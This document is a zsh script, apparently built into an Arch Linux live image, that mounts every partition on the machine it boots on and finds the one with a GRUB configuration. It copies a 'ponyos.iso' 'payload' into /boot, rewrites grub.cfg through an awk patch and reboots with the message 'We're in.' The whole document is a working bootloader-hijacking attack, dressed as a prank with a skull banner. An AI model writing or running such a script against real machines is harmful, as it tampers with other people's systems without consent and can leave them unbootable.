#!/bin/zsh
# This is added to airootfs

debug() { printf "$0[DEBUG]: %s\n" "$*" >&2 }
green() { echo -e '\e[32m' }
normal() { echo -e '\e[39m' }
red() { echo -e '\e[91m' }

red
cat skull.txt

# Mount all filesystems until we found one with /boot partition
for partition in /dev/disk/by-id/*; do
    fname=$(basename "$partition")
    mkdir "$fname"
    mount -o rw "$partition" "$fname"
    if [ -d "$fname/boot" ] && [ -d "$fname/boot/grub" ] && [ -f "$fname/boot/grub/grub.cfg" ]; then
        green
        echo "Found match on partition $fname"
        normal
        (
        # If anything here fails for some reason, abort it immediately
        # and continue searching.
        setopt -eu
        # Copy ponyos
        echo "Copying payload"
        cp ponyos.iso "$fname/boot"
        # Patch grub config file
        echo "Patching bootloader"
        cp "$fname/boot/grub/grub.cfg" "$fname/boot/grub/grub.cfg.bak"
        awk -f "patch-bootloader.awk" "$fname/boot/grub/grub.cfg" > "$fname/boot/grub/grub.cfg.new"
        mv "$fname/boot/grub/grub.cfg.new" "$fname/boot/grub/grub.cfg"
        echo "We're in. Rebooting."
        # Wait a bit for extra effect
        sleep 1
        reboot
        exit 0
        )
        red
        echo "Aborting $fname, something went wrong."
        normal
    fi
    umount "$fname"
    rm -d "$fname"
done
